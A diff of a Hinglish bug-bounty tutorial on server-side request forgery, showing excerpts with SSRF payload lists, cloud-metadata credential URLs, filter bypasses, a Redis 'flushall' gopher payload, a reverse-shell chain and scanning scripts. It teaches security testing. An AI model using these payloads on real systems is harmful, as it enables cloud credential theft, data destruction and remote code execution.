@@ -1,18 +1,13 @@
 # :globe_with_meridians: SSRF Server-Side Request Forgery: Server Ko Apna Agent Banao, Internal Network Explore Karo! (Hinglish Mein)
 
-> **Original Source:** [SSRF Server-Side Request Forgery: Server Ko Apna Agent Banao, Internal Network Explore Karo! (Hinglish Mein)](https://infosecwriteups.com/ssrf-server-side-request-forgery-server-ko-apna-agent-banao-internal-network-explore-karo-4b48abb86e34)
-> **Platform:** infosecwriteups.com | **Category:** `WEB`
-
 ---
 
 # SSRF Server-Side Request Forgery: Server Ko Apna Agent Banao, Internal Network Explore Karo! (Hinglish Mein)
-
 
 Series: Bug Bounty Zero se Hero 🦸 | Article #17
 *By HackerMD | 19 min read*
 
 ## Aaj Kya Seekhenge?
-
 
 - SSRF kya hai bilkul basics se
 
@@ -32,12 +27,9 @@ Series: Bug Bounty Zero se Hero 🦸 | Article #17
 
 Kyun zaroori hai? SSRF aaj ke cloud-heavy world mein sabse critical vulnerability ban gayi hai! AWS EC2 pe ek SSRF = IAM credentials = Poora AWS account compromise! Companies ne $10,000 se $50,000+ bounty diya hai sirf SSRF ke liye!
 
-
 ## SSRF Kya Hai? Simple Analogy
 
-
 Socho ek Delivery Boy hai:
-
 
 ```
 Normal:
@@ -54,9 +46,7 @@ Problem:
 → Jo tum directly nahi ja sakte!
 ```
 
-
 Website mein:
-
 
 ```
 Normal:
@@ -71,12 +61,9 @@ Server: AWS Metadata fetch karta hai! 🔴
 Result: AWS credentials exposed!
 ```
 
-
 ## SSRF Ke Types
 
-
 ## Type 1: Basic SSRF Response Direct Milta Hai
-
 
 ```
 Server fetch karta hai → Response directly tumhe milta hai!
@@ -92,9 +79,7 @@ Internal access:
 → Response seedha tumhe milta hai!
 ```
 
-
 ## Type 2: Blind SSRF Response Nahi Milta
-
 
 ```
 Server fetch karta hai — lekin response nahi dikhata!
@@ -108,9 +93,7 @@ Test karo Interactsh se:
 → Callback aaya? = Blind SSRF confirmed!
 ```
 
-
 ## PART 2: Kahan Dhundhen SSRF?
-
 
 ```
 🖼️ Image URL parameters:
@@ -153,12 +136,9 @@ Email templates
 <url>https://...</url>
 ```
 
-
 ## PART 3: SSRF Payloads Sabhi Try Karo
 
-
 ## Basic Localhost Payloads:
-
 
 ```
 http://localhost
@@ -172,9 +152,7 @@ http://localtest.me
 http://spoofed.burpcollaborator.net
 ```
 
-
 ## Internal Network Exploration:
-
 
 ```
 # Common internal IPs
@@ -196,12 +174,9 @@ http://127.0.0.1:2375 → Docker API!
 http://127.0.0.1:5984 → CouchDB
 ```
 
-
 ## Cloud Metadata HIGHEST VALUE!
 
-
 ## AWS EC2 Metadata:
-
 
 ```
 # Classic endpoint (v1 — no auth needed!)
@@ -226,9 +201,7 @@ aws ec2 describe-instances
 → Poora AWS account access! 💰
 ```
 
-
 ## GCP Metadata:
-
 
 ```
 http://metadata.google.internal/computeMetadata/v1/
@@ -240,9 +213,7 @@ Metadata-Flavor: Google
 Token milega → GCP APIs access!
 ```
 
-
 ## Azure Metadata:
-
 
 ```
 http://169.254.169.254/metadata/instance?api-version=2021-02-01
@@ -252,9 +223,7 @@ Header:
 Metadata: true
 ```
 
-
 ## DigitalOcean Metadata:
-
 
 ```
 http://169.254.169.254/metadata/v1/
@@ -262,12 +231,9 @@ http://169.254.169.254/metadata/v1/account-id
 http://169.254.169.254/metadata/v1/user-data
 ```
 
-
 ## PART 4: SSRF Bypass Techniques Elite Level
 
-
 ## Bypass 1: IP Encoding Tricks
-
 
 ```
 # Decimal notation
@@ -293,9 +259,7 @@ http://[::ffff:127.0.0.1]/
 http://[0:0:0:0:0:ffff:127.0.0.1]/
 ```
 
-
 ## Bypass 2: DNS Rebinding
-
 
 ```
 # Apna domain setup karo:
@@ -311,9 +275,7 @@ http://7f000001.1time.rbndr.us/
 → Pehle 1.0.0.127 → Phir 127.0.0.1!
 ```
 
-
 ## Bypass 3: URL Redirects
-
 
 ```
 # Agar server HTTPS follow karta hai
@@ -325,9 +287,7 @@ http://7f000001.1time.rbndr.us/
 → Server follow karta hai → Internal access!
 ```
 
-
 ## Bypass 4: Protocol Smuggling
-
 
 ```
 # Different protocols try karo:
@@ -342,9 +302,7 @@ sftp://127.0.0.1:22/
 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
 ```
 
-
 ## Bypass 5: URL Parsing Confusion
-
 
 ```
 # @ character trick:
@@ -365,9 +323,7 @@ http://127.0.0.1%09evil.com
 http://127.0.0.1%20evil.com
 ```
 
-
 ## Bypass 6: Domain Confusion
-
 
 ```
 # Domains that resolve to 127.0.0.1:
@@ -379,12 +335,9 @@ vcap.me
 spoofed.burpcollaborator.net
 ```
 
-
 ## PART 5: SSRF to RCE Maximum Impact!
 
-
 ## Chain 1: SSRF → Redis → RCE
-
 
 ```
 # Agar Redis internally chal raha hai (port 6379)
@@ -398,9 +351,7 @@ nc -lvnp 4444
 → Reverse shell! RCE! 🔴
 ```
 
-
 ## Chain 2: SSRF → AWS → Full Compromise
-
 
 ```
 Step 1: SSRF dhundho
@@ -426,9 +377,7 @@ aws rds describe-db-instances → Databases!
 → Critical! $10,000-$50,000 bounty range! 💰
 ```
 
-
 ## Chain 3: SSRF → Internal Admin → Account Takeover
-
 
 ```
 Step 1: Internal admin panel dhundho
@@ -444,12 +393,9 @@ Step 3: Actions trigger karo
 → Privilege escalation → Admin access!
 ```
 
-
 ## PART 6: Automated SSRF Testing
 
-
 ## Tool 1: SSRFmap
-
 
 ```
 # Install karo
@@ -476,9 +422,7 @@ python3 ssrfmap.py \
 -m all
 ```
 
-
 ## Tool 2: Interactsh Blind SSRF Detection
-
 
 ```
 # Install karo
@@ -499,9 +443,7 @@ interactsh-client
 # HTTP/DNS callbacks = Blind SSRF confirmed!
 ```
 
-
 ## Tool 3: Nuclei SSRF Templates
-
 
 ```
 # Nuclei SSRF templates
@@ -517,9 +459,7 @@ nuclei -l targets.txt \
 -o cloud_ssrf.txt
 ```
 
-
 ## PART 7: Complete Elite SSRF Workflow
-
 
 ```
 #!/bin/bash
@@ -578,9 +518,7 @@ echo "SSRF Found : $(cat $DIR/ssrf_found.txt 2>/dev/null | wc -l)"
 echo "Results in : $DIR/"
 ```
 
-
 ## SSRF Cheat Sheet Quick Reference
-
 
 ```
 # ─── DETECTION ───────────────────────────
@@ -619,9 +557,7 @@ ssrfmap → Automated exploitation
 nuclei -tags ssrf → Template scanning
 ```
 
-
 ## Aaj Ka Homework
-
 
 ```
 # 1. Interactsh setup karo:
@@ -645,9 +581,7 @@ curl "http://localhost:8080/?url=http://169.254.169.254/latest/meta-data/"
 # Kaunsa bypass technique sabse interesting laga?
 ```
 
-
 ## Quick Revision
-
 
 ```
 🌐 SSRF = Server ko apni taraf se request bhejwao
@@ -662,52 +596,38 @@ SSRF → AWS creds → Full compromise
 💰 Bounty Range = $500 (basic) to $50,000+ (AWS keys)
 ```
 
-
 ## Meri Baat…
 
-
 Ek private program pe maine ek image upload feature dekha:
-
 
 ```
 POST /api/profile/avatar
 {"image_url": "https://example.com/photo.jpg"}
 ```
 
-
 Maine socha URL fetch karta hai server!
-
 
 ## Get Hacker MD’s stories in your inbox
 
-
 Join Medium for free to get updates from this writer.
-
 
 Remember me for faster sign in
 
-
 Test kiya:
-
 
 ```
 {"image_url": "https://MY_INTERACTSH.oast.pro"}
 ```
 
-
 Interactsh pe callback aaya! Blind SSRF confirmed!
 
-
 Ab AWS metadata:
-
 
 ```
 {"image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-ec2-role"}
 ```
 
-
 Response:
-
 
 ```
 {
@@ -718,25 +638,17 @@ Response:
 }
 ```
 
-
 AWS production credentials!
-
 
 ```
 aws s3 ls # 47 S3 buckets!
 aws secretsmanager list-secrets # Database passwords!
 ```
 
-
 Bounty: $12,500 Critical! 🎉
 
-
 Lesson: Image URL, webhook URL, callback URL koi bhi URL parameter SSRF ka door ho sakta hai hamesha test karo!
-
 
 Agle article mein CORS Misconfiguration Cross-Origin Resource Sharing ke wrong settings se kaise user data steal hota hai! Simple lekin powerful! 🔥
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/ssrf-server-side-request-forgery-server-ko-apna-agent-banao-internal-network-explore-karo-4b48abb86e34). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
